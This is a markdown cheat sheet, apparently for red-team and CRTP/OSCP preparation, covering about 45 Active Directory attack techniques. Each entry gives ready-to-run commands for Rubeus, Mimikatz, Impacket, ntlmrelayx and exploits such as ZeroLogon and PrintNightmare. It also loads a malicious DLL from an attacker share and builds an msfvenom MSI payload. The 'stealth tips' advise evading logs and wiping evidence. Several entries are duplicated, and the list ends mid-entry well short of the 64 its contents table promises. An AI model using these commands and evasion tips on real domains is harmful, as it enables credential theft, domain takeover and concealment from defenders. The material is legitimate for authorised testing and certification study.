# 🛡️ Active Directory Attack Techniques (Red Team Edition)

This document provides a detailed walkthrough of **25 real-world Active Directory attack techniques**, optimized for **CRTP**, **OSCP**, and stealth-focused **Red Team operations**.

---

## ✅ Features

- 🔐 Realistic AD attacks (AS-REP Roasting, Kerberoasting, DCSync, etc.)
- 🧠 Understand how each technique works under the hood
- 🛠 Tools and usage examples
- 🕵️‍♂️ Red Team **stealth recommendations** for quiet execution
- 📥 Downloadable HTML [Interactive Checklist](./CRTP_OSCP_AD_CheckList.html) available

---

## 📑 Table of Contents
- [1. AS-REP Roasting](#as-rep-roasting)
- [2. Kerberoasting](#kerberoasting)
- [3. Pass-the-Hash (PtH)](#pass-the-hash)
- [4. Pass-the-Ticket (PtT)](#pass-the-ticket)
- [5. DCSync Attack](#dcsync-attack)
- [6. Unconstrained Delegation](#unconstrained-delegation)
- [7. Constrained Delegation](#constrained-delegation)
- [8. Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation)
- [9. Silver Ticket](#silver-ticket)
- [10. Golden Ticket](#golden-ticket)
- [11. NTDS.dit Dump](#ntdsdit-dump)
- [12. GPP Passwords](#gpp-passwords)
- [13. LAPS Dumping](#laps-dumping)
- [14. AdminSDHolder Abuse](#adminsdholder-abuse)
- [15. ACL Abuse](#acl-abuse)
- [16. Printer Spooler Bug](#printer-spooler-bug)
- [17. Shadow Credentials](#shadow-credentials)
- [18. Certificate Template Escalation (ESC1)](#certificate-template-escalation)
- [19. Service Unquoted Path Abuse](#service-unquoted-path-abuse)
- [20. RDP Hijack](#rdp-hijack)
- [21. SAM & SYSTEM Hive Dump](#sam-%26-system-hive-dump)
- [22. LSA Secrets Dump](#lsa-secrets-dump)
- [23. RID Cycling](#rid-cycling)
- [24. Token Impersonation](#token-impersonation)
- [25. WMI Lateral Movement](#wmi-lateral-movement)
- [26. ADCS ESC1: Misconfigured Certificate Template](#adcs-esc1%3A-misconfigured-certificate-template)
- [27. ADCS ESC8: NTLM Relay to Web Enrollment](#adcs-esc8%3A-ntlm-relay-to-web-enrollment)
- [28. PetitPotam + ADCS (EFSRPC Coercion)](#petitpotam-%2B-adcs-%28efsrpc-coercion%29)
- [29. AdminSDHolder Persistence](#adminsdholder-persistence)
- [30. SID Filtering Bypass](#sid-filtering-bypass)
- [31. LDAP ACL Enumeration & Abuse](#ldap-acl-enumeration-%26-abuse)
- [32. Printer Bug (MS-RPRN Coercion)](#printer-bug-%28ms-rprn-coercion%29)
- [33. Unusual SPN Registration for Lateral Movement](#unusual-spn-registration-for-lateral-movement)
- [34. ESC2: Template with Weak ACL](#esc2%3A-template-with-weak-acl)
- [35. ESC3: Enrollable by Low-Priv Group](#esc3%3A-enrollable-by-low-priv-group)
- [36. ESC4: Manager Approval Misuse](#esc4%3A-manager-approval-misuse)
- [37. ESC5: Enroll as Machine Template](#esc5%3A-enroll-as-machine-template)
- [38. ESC6: Authenticated Users Can Enroll](#esc6%3A-authenticated-users-can-enroll)
- [39. ESC7: Vulnerable Unused Template](#esc7%3A-vulnerable-unused-template)
- [40. DCSync via GenericAll / Replication Rights](#dcsync-via-genericall--replication-rights)
- [41. Abusing GenericWrite on User Object](#abusing-genericwrite-on-user-object)
- [42. Overpass-the-Hash (Pass-the-Key)](#overpass-the-hash-%28pass-the-key%29)
- [43. RBCD via AddAllowedToAct (ACL Abuse)](#rbcd-via-addallowedtoact-%28acl-abuse%29)
- [44. Abusing Resource-Based Constrained Delegation (No Pre-auth)](#abusing-resource-based-constrained-delegation-%28no-pre-auth%29)
- [45. DCShadow Attack](#dcshadow-attack)
- [46. Golden Ticket Attack](#golden-ticket-attack)
- [47. Skeleton Key Attack](#skeleton-key-attack)
- [48. SIDHistory Injection](#sidhistory-injection)
- [49. AdminSDHolder Abuse](#adminsdholder-abuse)
- [50. Unconstrained Delegation Abuse](#unconstrained-delegation-abuse)
- [51. Kerberoasting with AES Keys](#kerberoasting-with-aes-keys)
- [52. Printer Bug + RBCD](#printer-bug-%2B-rbcd)
- [53. Kerberos SID Filtering Bypass](#kerberos-sid-filtering-bypass)
- [54. AS-REP Roasting (AES Variant)](#as-rep-roasting-%28aes-variant%29)
- [55. DNSAdmin to DC Compromise](#dnsadmin-to-dc-compromise)
- [56. Abusing ACL on GPO](#abusing-acl-on-gpo)
- [57. Shadow Credentials (Key Credential Link Attack)](#shadow-credentials-%28key-credential-link-attack%29)
- [58. Exchange PrivEsc via WriteDacl](#exchange-privesc-via-writedacl)
- [59. ReadGMSAPassword for Privilege Escalation](#readgmsapassword-for-privilege-escalation)
- [60. Kerberos Delegation Loop](#kerberos-delegation-loop)
- [61. Abuse Service Principal Name (SPN) via Resource-based Constrained Delegation](#abuse-service-principal-name-%28spn%29-via-resource-based-constrained-delegation)
- [62. Malicious GPO Deployment](#malicious-gpo-deployment)
- [63. Kerberos Constrained Delegation (KCD) Abuse](#kerberos-constrained-delegation-%28kcd%29-abuse)
- [64. Unquoted Service Path Privilege Escalation](#unquoted-service-path-privilege-escalation)

---



## 📋 Attack Descriptions


<a name="as-rep-roasting"></a>
<details>
  <summary><strong>1. AS-REP Roasting</strong></summary>

- **Purpose**: Offline cracking of user password hash  
- **Functionality**: Kerberos allows unauthenticated ticket requests for users with DONT_REQ_PREAUTH  
- **Why It's Vulnerable**: No pre-auth required, so TGT encrypted with weak password hash can be cracked  
- **How to Test**: Use `GetNPUsers.py` or `Rubeus` to extract AS-REP hashes  
```bash
# Using Impacket
GetNPUsers.py -dc-ip 192.168.1.10 domain.local/ -usersfile users.txt

# Using Rubeus
Rubeus.exe asreproast
```
- **Tools**: Impacket, Rubeus, hashcat  
- **Stealth Tips**: Use known usernames only; avoid brute-forcing; low log footprint  
</details>

<a name="kerberoasting"></a>
<details>
  <summary><strong>2. Kerberoasting</strong></summary>

- **Purpose**: Offline password cracking of service accounts  
- **Functionality**: Any domain user can request service tickets for SPNs  
- **Why It's Vulnerable**: Tickets are encrypted with service account NTLM hash  
- **How to Test**: Extract SPN tickets using `GetUserSPNs.py` or `Rubeus`  
```bash
# Using Impacket
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.local/user:password

# Using Rubeus
Rubeus.exe kerberoast
```
- **Tools**: Impacket, Rubeus, hashcat  
- **Stealth Tips**: Limit SPN requests; monitor for Event ID 4769  
</details>

<a name="pass-the-hash"></a>
<details>
  <summary><strong>3. Pass-the-Hash (PtH)</strong></summary>

- **Purpose**: Authenticate without knowing plaintext password  
- **Functionality**: Windows allows authentication using NTLM hash  
- **Why It's Vulnerable**: Captured hashes can be reused for lateral movement  
- **How to Test**: Use tools to authenticate with just the hash  
```bash
# SMB via wmiexec
wmiexec.py domain.local/user@192.168.1.20 -hashes <NTLM>:<NTLM>

# WinRM
evil-winrm -i 192.168.1.20 -u user -H <NTLM>
```
- **Tools**: Mimikatz, Impacket, Evil-WinRM  
- **Stealth Tips**: Use valid hashes only; avoid brute-force; monitor 4624 events  
</details>

<a name="pass-the-ticket"></a>
<details>
  <summary><strong>4. Pass-the-Ticket (PtT)</strong></summary>

- **Purpose**: Authenticate using forged or stolen Kerberos tickets  
- **Functionality**: Windows lets users inject TGT/TGS tickets into session  
- **Why It's Vulnerable**: Kerberos tickets can be reused or forged  
- **How to Test**: Inject ticket using `Rubeus` or `Mimikatz`  
```bash
# Dump existing tickets
Rubeus.exe dump

# Inject ticket
Rubeus.exe ptt /ticket:<base64>.kirbi

# Or with Mimikatz
kerberos::ptt ticket.kirbi
```
- **Tools**: Rubeus, Mimikatz  
- **Stealth Tips**: Reuse only valid, short-lived tickets; monitor ticket injection  
</details>

<a name="overpass-the-hash"></a>
<details>
  <summary><strong>5. Overpass-the-Hash (Pass-the-Key)</strong></summary>

- **Purpose**: Generate TGT using NTLM hash instead of password  
- **Functionality**: NTLM hash used to request TGT via Kerberos  
- **Why It's Vulnerable**: Weak NTLM protection enables fake TGT generation  
- **How to Test**: Use `Rubeus` to request and inject TGT  
```bash
# Request TGT using NTLM
Rubeus.exe asktgt /user:<user> /rc4:<NTLM> /domain:<domain.local>

# Inject ticket
Rubeus.exe ptt /ticket:<base64>.kirbi
```
- **Tools**: Rubeus, hashcat  
- **Stealth Tips**: Avoid multiple TGT requests; clean up tickets post-use  
</details>

<a name="golden-ticket"></a>
<details>
  <summary><strong>6. Golden Ticket</strong></summary>

- **Purpose**: Forge a TGT for any user with unlimited lifetime  
- **Functionality**: Built using krbtgt NTLM hash  
- **Why It's Vulnerable**: Compromise of `krbtgt` account enables full domain persistence  
- **How to Test**: Use `Mimikatz` to forge and inject a TGT  
```powershell
# Mimikatz command
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi
kerberos::ptt golden.kirbi
```
- **Tools**: Mimikatz  
- **Stealth Tips**: Use only when krbtgt hash is available; monitor 4768/4769 logs  
</details>

<a name="silver-ticket"></a>
<details>
  <summary><strong>7. Silver Ticket</strong></summary>

- **Purpose**: Forge TGS for specific service  
- **Functionality**: Uses service account NTLM hash (not krbtgt)  
- **Why It's Vulnerable**: No need to contact DC when using forged TGS  
- **How to Test**: Forge and inject TGS using Mimikatz or Rubeus  
```powershell
# Forge silver ticket
kerberos::golden /user:svcuser /domain:domain.local /sid:S-1-5-... /rc4:<NTLM> /service:cifs /target:hostname /ticket:silver.kirbi
kerberos::ptt silver.kirbi
```
- **Tools**: Mimikatz, Rubeus  
- **Stealth Tips**: No DC contact makes detection harder; cleanup injected TGS  
</details>

<a name="dcsync-attack"></a>
<details>
  <summary><strong>8. DCSync Attack</strong></summary>

- **Purpose**: Extract password hashes directly from DC  
- **Functionality**: Abuse `Replicating Directory Changes` rights to mimic a DC  
- **Why It's Vulnerable**: Misconfigured ACLs grant replication rights  
- **How to Test**: Use Mimikatz `lsadump::dcsync`  
```powershell
lsadump::dcsync /domain:domain.local /user:Administrator
```
- **Tools**: Mimikatz  
- **Stealth Tips**: Generates log 4662; use on stealthy admin accounts  
</details>

<a name="dcshadow-attack"></a>
<details>
  <summary><strong>9. DCShadow Attack</strong></summary>

- **Purpose**: Push malicious changes into AD (e.g., SIDHistory)  
- **Functionality**: Register rogue domain controller and replicate changes  
- **Why It's Vulnerable**: Abuse of replication permissions  
- **How to Test**: Use `mimikatz` DCShadow module  
```powershell
# In mimikatz
lsadump::dcshadow /object:CN=user,CN=Users,DC=domain,DC=local /attribute:Description /value:Hacked
```
- **Tools**: Mimikatz  
- **Stealth Tips**: Hard to detect; monitor for rogue DC registrations  
</details>

<a name="shadow-credentials"></a>
<details>
  <summary><strong>10. Shadow Credentials</strong></summary>

- **Purpose**: Persist access using alternate credentials (KeyCredential)  
- **Functionality**: Add fake key to user object for silent authentication  
- **Why It's Vulnerable**: Misconfigured ACLs allow adding `msDS-KeyCredentialLink`  
- **How to Test**: Use `Whisker` or `pyWhisker`  
```bash
# Using pyWhisker
python3 pywhisker.py --action add --target 'user@domain.local' --sid S-1-5-... --cert-pfx evil.pfx
```
- **Tools**: pyWhisker, Rubeus, adidnsdump  
- **Stealth Tips**: Extremely stealthy; nearly no log footprint  
</details>


<a name="unconstrained-delegation"></a>
<details>
  <summary><strong>11. Unconstrained Delegation</strong></summary>

- **Purpose**: Impersonate any user who authenticates to a service  
- **Functionality**: TGTs are stored in memory and can be stolen  
- **Why It's Vulnerable**: Services with unconstrained delegation store user TGTs  
- **How to Test**: Identify systems with unconstrained delegation  
```powershell
# PowerView
Get-DomainComputer -Unconstrained

# Extract TGT from memory using Rubeus
Rubeus.exe dump
```
- **Tools**: PowerView, Rubeus, Mimikatz  
- **Stealth Tips**: Avoid crashing LSASS; use on logged-in targets  
</details>

<a name="constrained-delegation"></a>
<details>
  <summary><strong>12. Constrained Delegation</strong></summary>

- **Purpose**: Impersonate a user to a specific service  
- **Functionality**: Service can request TGS on behalf of user  
- **Why It's Vulnerable**: Misconfigured S4U2Self/S4U2Proxy allows impersonation  
- **How to Test**: Abuse using S4U attack with Rubeus  
```powershell
# S4U attack using Rubeus
Rubeus.exe s4u /user:<user> /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local /domain:<domain>
```
- **Tools**: Rubeus  
- **Stealth Tips**: No DC contact if ticket reused; monitor 4769 logs  
</details>

<a name="resource-based-constrained-delegation"></a>
<details>
  <summary><strong>13. Resource-Based Constrained Delegation (RBCD)</strong></summary>

- **Purpose**: Impersonate users to target machine or service  
- **Functionality**: Target object controls its own delegation settings  
- **Why It's Vulnerable**: Any user with write access to target can configure delegation  
- **How to Test**: Use `GenericWrite`/`GenericAll` to set msDS-AllowedToActOnBehalfOfOtherIdentity  
```powershell
# Using PowerView
Set-ADComputer -Identity TARGET -PrincipalsAllowedToDelegateToAccount ATTACKER$

# Using Rubeus and S4U
Rubeus.exe s4u ...
```
- **Tools**: PowerView, Rubeus, SharpHound  
- **Stealth Tips**: Clean up delegation entries post-exploitation  
</details>

<a name="printer-bug-coercion"></a>
<details>
  <summary><strong>14. Printer Bug (SpoolSample)</strong></summary>

- **Purpose**: Coerce authentication from remote machine  
- **Functionality**: Exploit MS-RPRN to trigger SMB authentication  
- **Why It's Vulnerable**: Misuse of Print Spooler to trigger outbound auth  
- **How to Test**: Use `SpoolSample` or `rpcdump`  
```bash
# SpoolSample
SpoolSample.exe <victim-ip> <attacker-ip>
```
- **Tools**: SpoolSample, Inveigh  
- **Stealth Tips**: Use with relaying setup (e.g., ntlmrelayx)  
</details>

<a name="shadow-admins"></a>
<details>
  <summary><strong>15. Shadow Admins</strong></summary>

- **Purpose**: Persistence via indirect privilege escalation  
- **Functionality**: Users granted rights over admin accounts  
- **Why It's Vulnerable**: Misconfigured ACLs allow privilege chaining  
- **How to Test**: Identify users/groups with indirect control  
```powershell
# Using PowerView
Invoke-ACLScanner | ? { $_.IdentityReference -like "*admin*" }
```
- **Tools**: PowerView, BloodHound  
- **Stealth Tips**: Shadow paths harder to detect than DA membership  
</details>

<a name="admin-sdholder-abuse"></a>
<details>
  <summary><strong>16. AdminSDHolder Abuse</strong></summary>

- **Purpose**: Persistent privilege escalation  
- **Functionality**: Changes to AdminSDHolder propagate to protected accounts  
- **Why It's Vulnerable**: Write access to AdminSDHolder object gives domain rights  
- **How to Test**: Add user to AdminSDHolder's ACL  
```powershell
# Using PowerView
Add-ADPermission -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -User attacker -ExtendedRights "All"
```
- **Tools**: PowerView, ADSI Edit  
- **Stealth Tips**: Change re-applies every 60 minutes; remove afterward  
</details>

<a name="acl-based-privesc"></a>
<details>
  <summary><strong>17. ACL-Based PrivEsc</strong></summary>

- **Purpose**: Escalate privileges using misconfigured object permissions  
- **Functionality**: WriteDACL/GenericAll enables adding membership or privileges  
- **Why It's Vulnerable**: Poor delegation of permissions  
- **How to Test**: Identify writeable objects using BloodHound or PowerView  
```powershell
# With PowerView
Invoke-ACLScanner

# Add user to group
Add-ADGroupMember -Identity "Domain Admins" -Members attacker
```
- **Tools**: PowerView, BloodHound  
- **Stealth Tips**: Clean audit trails, remove attacker after use  
</details>

<a name="gmsa-abuse"></a>
<details>
  <summary><strong>18. gMSA Abuse</strong></summary>

- **Purpose**: Abuse Group Managed Service Account to gain lateral access  
- **Functionality**: Passwords for gMSAs are retrievable by authorized systems  
- **Why It's Vulnerable**: Misconfigured read permissions allow extraction  
- **How to Test**: Use Mimikatz or custom tools to extract gMSA password  
```powershell
# Using Mimikatz
lsadump::gmsa
```
- **Tools**: Mimikatz, ADModule  
- **Stealth Tips**: Very stealthy if done from authorized machine  
</details>

<a name="ldap-signing-downgrade"></a>
<details>
  <summary><strong>19. LDAP Signing Downgrade</strong></summary>

- **Purpose**: Downgrade secure LDAP communication for interception  
- **Functionality**: Disable signing requirements to perform MITM  
- **Why It's Vulnerable**: Default configuration allows unsigned LDAP  
- **How to Test**: Use `ntlmrelayx` with LDAP relaying  
```bash
# Relaying NTLM to LDAP
ntlmrelayx.py -t ldap://dc.domain.local --escalate-user attacker
```
- **Tools**: Impacket, Responder, ntlmrelayx  
- **Stealth Tips**: Combine with coercion attacks (e.g., PetitPotam)  
</details>

<a name="zerologon"></a>
<details>
  <summary><strong>20. Zerologon (CVE-2020-1472)</strong></summary>

- **Purpose**: Full DC compromise via Netlogon flaw  
- **Functionality**: Exploits all-zero challenge to bypass auth  
- **Why It's Vulnerable**: Flawed cryptographic implementation in Netlogon  
- **How to Test**: Use `Zerologon` PoC or `impacket` script  
```bash
# Test
python3 zerologon_tester.py dc.domain.local

# Exploit
python3 zerologon_exploit.py dc.domain.local
```
- **Tools**: Impacket, CVE PoC  
- **Stealth Tips**: Very noisy; avoid unless authorized  
</details>

<a name="dnsadmin-to-dc-compromise"></a>
<details>
  <summary><strong>21. DNSAdmin to DC Compromise</strong></summary>

- **Purpose**: Elevate privileges to SYSTEM on a Domain Controller  
- **Functionality**: DNSAdmin can load DLLs through `dnscmd`  
- **Why It's Vulnerable**: DNS server service runs as SYSTEM and loads external DLLs  
- **How to Test**: Load a malicious DLL via `dnscmd`  
```bash
dnscmd <dc> /config /serverlevelplugindll \attacker\share\malicious.dll
# Restart DNS service
sc \<dc> stop dns
sc \<dc> start dns
```
- **Tools**: dnscmd, msfvenom, smbserver.py  
- **Stealth Tips**: Clean up DLL path and logs after use  
</details>

<a name="password-spray"></a>
<details>
  <summary><strong>22. Password Spray</strong></summary>

- **Purpose**: Identify weak passwords across many users  
- **Functionality**: Attempts same password for multiple users to avoid lockout  
- **Why It's Vulnerable**: AD doesn’t detect horizontal brute force effectively  
- **How to Test**: Use CrackMapExec or Hydra  
```bash
crackmapexec smb <target> -u users.txt -p 'Password123'
```
- **Tools**: CrackMapExec, Hydra, Kerbrute  
- **Stealth Tips**: Respect lockout policy; long wait between tries  
</details>

<a name="llmnr-nbt-ns-poisoning"></a>
<details>
  <summary><strong>23. LLMNR/NBT-NS Poisoning</strong></summary>

- **Purpose**: Capture NetNTLMv2 hashes from network  
- **Functionality**: Responds to broadcast name resolution requests  
- **Why It's Vulnerable**: LLMNR/NBT-NS enabled by default  
- **How to Test**: Run Responder on local subnet  
```bash
responder -I eth0
```
- **Tools**: Responder, Hashcat  
- **Stealth Tips**: Only use when legitimate traffic exists  
</details>

<a name="golden-ticket"></a>
<details>
  <summary><strong>24. Golden Ticket</strong></summary>

- **Purpose**: Create forged TGTs to impersonate any user  
- **Functionality**: TGTs can be forged using KRBTGT hash  
- **Why It's Vulnerable**: Domain compromise gives access to KRBTGT  
- **How to Test**: Extract KRBTGT hash and forge TGT  
```powershell
# Mimikatz
lsadump::lsa /patch
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21... /krbtgt:<hash>
```
- **Tools**: Mimikatz  
- **Stealth Tips**: Set realistic lifetime, timestamps; avoid reuse  
</details>

<a name="silver-ticket"></a>
<details>
  <summary><strong>25. Silver Ticket</strong></summary>

- **Purpose**: Access services without contacting DC  
- **Functionality**: TGS can be forged using service account’s NTLM hash  
- **Why It's Vulnerable**: TGS validation does not require DC communication  
- **How to Test**: Use hash to forge TGS with Mimikatz or Rubeus  
```powershell
# Mimikatz
kerberos::ptt ticket.kirbi
```
- **Tools**: Mimikatz, Rubeus  
- **Stealth Tips**: Avoid Kerberos event logs; direct access to service  
</details>

<a name="privileged-session-hijack"></a>
<details>
  <summary><strong>26. Privileged Session Hijack</strong></summary>

- **Purpose**: Steal or reuse high-privilege token/session  
- **Functionality**: Session tokens in memory can be reused  
- **Why It's Vulnerable**: High-privilege sessions often left active  
- **How to Test**: Enumerate and steal token using Mimikatz  
```powershell
# Mimikatz
token::list
token::elevate
```
- **Tools**: Mimikatz  
- **Stealth Tips**: Avoid alerting interactive users  
</details>

<a name="kerberos-unconstrained-delegation-ticket-theft"></a>
<details>
  <summary><strong>27. Kerberos Unconstrained Delegation Ticket Theft</strong></summary>

- **Purpose**: Steal TGTs from systems with delegation enabled  
- **Functionality**: Attacker can extract TGT from memory after victim login  
- **Why It's Vulnerable**: Unconstrained delegation caches TGT in memory  
- **How to Test**: Wait for login, extract TGT  
```powershell
# Rubeus
Rubeus.exe dump
```
- **Tools**: Rubeus, Mimikatz  
- **Stealth Tips**: Passive collection; avoid causing logon  
</details>

<a name="kerberos-over-pass-the-ticket"></a>
<details>
  <summary><strong>28. Kerberos Over Pass-the-Ticket (PtT)</strong></summary>

- **Purpose**: Use forged TGT/TGS to authenticate  
- **Functionality**: Inject Kerberos ticket into current session  
- **Why It's Vulnerable**: No validation of origin of ticket  
- **How to Test**: Inject valid TGT  
```powershell
# Rubeus or Mimikatz
kerberos::ptt ticket.kirbi
```
- **Tools**: Mimikatz, Rubeus  
- **Stealth Tips**: Use short lifetime; remove ticket after use  
</details>

<a name="kerberos-rc4-ticket-renewal"></a>
<details>
  <summary><strong>29. Kerberos RC4 Ticket Renewal</strong></summary>

- **Purpose**: Extend lifetime of Kerberos tickets  
- **Functionality**: Re-request new ticket using valid one  
- **Why It's Vulnerable**: Reuse of hash for encryption allows forging  
- **How to Test**: Use RC4 key with Rubeus  
```powershell
# Rubeus
Rubeus.exe renew /ticket:<kirbi>
```
- **Tools**: Rubeus  
- **Stealth Tips**: Limit renewals; use realistic renewal times  
</details>

<a name="delegation-chaining"></a>
<details>
  <summary><strong>30. Delegation Chaining</strong></summary>

- **Purpose**: Pivot through multiple delegation relationships  
- **Functionality**: Abuse chained constrained delegation  
- **Why It's Vulnerable**: Hard to audit complex chains  
- **How to Test**: Enumerate delegation paths using BloodHound  
```bash
# BloodHound
Collect data → Analyze delegation edges
```
- **Tools**: BloodHound, Rubeus  
- **Stealth Tips**: Use with known chains only; avoid failed impersonation  
</details>


<a name="kerberos-resource-based-constrained-delegation-rbcd"></a>
<details>
  <summary><strong>31. Resource-Based Constrained Delegation (RBCD)</strong></summary>

- **Purpose**: Elevate privileges by controlling another computer’s delegation rights  
- **Functionality**: Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute  
- **Why It's Vulnerable**: Computers can be delegated rights to impersonate users  
- **How to Test**: Create a computer account, set RBCD on target, and impersonate  
```powershell
# Powermad
New-MachineAccount -MachineAccount "owned$" -Password "Password123!"
Set-ADComputer 'TARGET' -PrincipalsAllowedToDelegateToAccount 'owned$'
```
- **Tools**: Powermad, Rubeus, mimikatz  
- **Stealth Tips**: Avoid AD logs; use short-lived account  
</details>

<a name="shadow-credentials"></a>
<details>
  <summary><strong>32. Shadow Credentials</strong></summary>

- **Purpose**: Persist access by planting alternate credentials  
- **Functionality**: Abuse msDS-KeyCredentialLink attribute  
- **Why It's Vulnerable**: Weak ACLs allow editing sensitive attributes  
- **How to Test**: Inject certificate or key credential  
```powershell
# Whisker or pyWhisker
pywhisker add -u targetuser -d domain -k c:\cert.pfx
```
- **Tools**: pyWhisker, Certify  
- **Stealth Tips**: Avoid changing primary credentials; clean up afterward  
</details>

<a name="acl-based-privilege-escalation"></a>
<details>
  <summary><strong>33. ACL-Based Privilege Escalation</strong></summary>

- **Purpose**: Abuse weak ACLs to gain privileges  
- **Functionality**: Modify rights on sensitive objects (e.g., user, computer)  
- **Why It's Vulnerable**: Delegation often misconfigured  
- **How to Test**: Enumerate ACLs using BloodHound  
```bash
# SharpHound/BloodHound
Collect ACL data → Analyze Effective Permissions
```
- **Tools**: BloodHound, PowerView, ADACLScanner  
- **Stealth Tips**: Use inherited ACLs stealthily; revert after use  
</details>

<a name="dcsync"></a>
<details>
  <summary><strong>34. DCSync Attack</strong></summary>

- **Purpose**: Dump password hashes for any domain user  
- **Functionality**: Mimics domain controller behavior to replicate secrets  
- **Why It's Vulnerable**: User with Replication rights can pull hashes  
- **How to Test**: Use Mimikatz with DCSync  
```powershell
# Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
```
- **Tools**: Mimikatz  
- **Stealth Tips**: Target only necessary users; avoid dumping all  
</details>

<a name="unquoted-service-path"></a>
<details>
  <summary><strong>35. Unquoted Service Path</strong></summary>

- **Purpose**: Exploit unquoted service path to execute malicious binary as SYSTEM  
- **Functionality**: Service with unquoted path and spaces can execute attacker binary  
- **Why It's Vulnerable**: OS treats path as space-delimited and searches left-to-right  
- **How to Test**: Place executable in one of the interpreted paths  
```powershell
# Identify service
wmic service get name,pathname,startmode | findstr /i "Auto"
```
- **Tools**: PowerUp, sc.exe  
- **Stealth Tips**: Restart service quietly; clean up dropped binary  
</details>

<a name="alwaysinstall-elevated-misconfiguration"></a>
<details>
  <summary><strong>36. AlwaysInstallElevated Misconfiguration</strong></summary>

- **Purpose**: Gain SYSTEM privileges via MSI installer  
- **Functionality**: Exploit policy that allows non-admins to run MSIs as SYSTEM  
- **Why It's Vulnerable**: Admins leave AlwaysInstallElevated registry key set  
- **How to Test**: Check registry keys and run malicious MSI  
```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
msfvenom -p windows/exec CMD=calc.exe -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```
- **Tools**: msfvenom, msiexec  
- **Stealth Tips**: Rename MSI, clean up registry traces  
</details>

<a name="service-permissions-abuse"></a>
<details>
  <summary><strong>37. Service Permissions Abuse</strong></summary>

- **Purpose**: Modify service config to execute code as SYSTEM  
- **Functionality**: Misconfigured permissions allow binary path modification  
- **Why It's Vulnerable**: Services run as SYSTEM and permissions often too broad  
- **How to Test**: Use accesschk to find writable services, modify path  
```bash
accesschk.exe -uwcqv "Authenticated Users" * /svc
sc config <service> binpath= "cmd.exe /c calc.exe"
```
- **Tools**: sc.exe, accesschk.exe  
- **Stealth Tips**: Restore original path; clean artifacts  
</details>

<a name="wmi-event-subscription-persistence"></a>
<details>
  <summary><strong>38. WMI Event Subscription Persistence</strong></summary>

- **Purpose**: Maintain persistence through WMI triggers  
- **Functionality**: Subscribes to system events and executes payload  
- **Why It's Vulnerable**: WMI is deeply integrated and hard to audit  
- **How to Test**: Create a permanent event subscription  
```powershell
# PowerShell example
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter ...
```
- **Tools**: PowerShell, WMI Explorer  
- **Stealth Tips**: Name events benignly; delete after use  
</details>

<a name="admin-sdholder-abuse"></a>
<details>
  <summary><strong>39. AdminSDHolder Abuse</strong></summary>

- **Purpose**: Persist elevated privileges via protected groups template  
- **Functionality**: AdminSDHolder replicates ACLs to high-privilege users every 60 min  
- **Why It's Vulnerable**: Modifying AdminSDHolder can give you rights over domain admins  
- **How to Test**: Add self as full control in ACLs of AdminSDHolder  
```powershell
Set-ADACL -Target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" ...
```
- **Tools**: PowerView, ADSIEdit  
- **Stealth Tips**: Remove ACLs after use; high risk  
</details>

<a name="domain-controller-sync-via-rbcd"></a>
<details>
  <summary><strong>40. Domain Controller Sync via RBCD</strong></summary>

- **Purpose**: Gain full replication rights and extract hashes  
- **Functionality**: Combines RBCD + DCSync to replicate secrets  
- **Why It's Vulnerable**: If RBCD set on DC object, DCSync becomes possible  
- **How to Test**: Create computer, set delegation to DC, and DCSync  
```powershell
# Powermad + Rubeus
New-MachineAccount ...
Set-RBCD on DC → Use Rubeus DCSync
```
- **Tools**: Powermad, Rubeus, mimikatz  
- **Stealth Tips**: Use temporary objects; clear evidence  
</details>


<a name="netlogon-zero-logon-cve-2020-1472"></a>
<details>
  <summary><strong>41. Netlogon ZeroLogon (CVE-2020-1472)</strong></summary>

- **Purpose**: Gain domain admin access by exploiting Netlogon protocol flaw  
- **Functionality**: Sends crafted Netlogon messages with zeroed fields  
- **Why It's Vulnerable**: Cryptographic flaw allows spoofing DC credentials  
- **How to Test**: Run Python PoC to authenticate as DC  
```bash
python3 zerologon_tester.py dc-name dc-ip
```
- **Tools**: Impacket, ZeroLogon exploit scripts  
- **Stealth Tips**: Exploit causes logs; use once and reset DC account  
</details>

<a name="ntlm-relay"></a>
<details>
  <summary><strong>42. NTLM Relay</strong></summary>

- **Purpose**: Intercept and relay authentication to another service  
- **Functionality**: Man-in-the-middle attack using NTLM challenge-response  
- **Why It's Vulnerable**: Services accepting NTLM without signing  
- **How to Test**: Use responder + ntlmrelayx  
```bash
responder -I eth0
ntlmrelayx.py -t ldap://target --escalate-user vulnerable
```
- **Tools**: Responder, ntlmrelayx  
- **Stealth Tips**: Relay once; avoid repeated noise  
</details>

<a name="printnightmare-cve-2021-34527"></a>
<details>
  <summary><strong>43. PrintNightmare (CVE-2021-34527)</strong></summary>

- **Purpose**: Remote code execution via Print Spooler service  
- **Functionality**: Uploads DLL to system via printer API  
- **Why It's Vulnerable**: Print Spooler exposed and unpatched  
- **How to Test**: Use exploit to write DLL and trigger  
```bash
Invoke-Nightmare -NewUser "pwned" -AddToAdministrators
```
- **Tools**: PowerShell PoCs, Mimikatz  
- **Stealth Tips**: Remove DLL, cleanup user afterward  
</details>

<a name="samaccountname-spoofing-cve-2021-42278"></a>
<details>
  <summary><strong>44. SAMAccountName Spoofing (CVE-2021-42278)</strong></summary>

- **Purpose**: Rename machine account to impersonate a domain admin  
- **Functionality**: Exploits mismatch in machine account naming checks  
- **Why It's Vulnerable**: No strict validation for account renames  
- **How to Test**: Rename machine account and request TGT  
```powershell
Rename-ADObject -Identity "CN=old" -NewName "DC01"
Rubeus asktgt /user:DC01 /rc4:<hash>
```
- **Tools**: PowerShell, Rubeus  
- **Stealth Tips**: Rename back quickly; keep account disposable  
</details>

<a name="petitpotam-adcs-relay"></a>
<details>
  <summary><strong>45. PetitPotam + ADCS Relay</strong></summary>

- **Purpose**: Coerce machine to authenticate to attacker and relay to ADCS  
- **Functionality**: EFSRPC coercion to force auth + ADCS relay  
- **Why It's Vulnerable**: Unauthenticated access to EFSRPC + misconfigured templates  
- **How to Test**: Use petitpotam + ntlmrelayx  
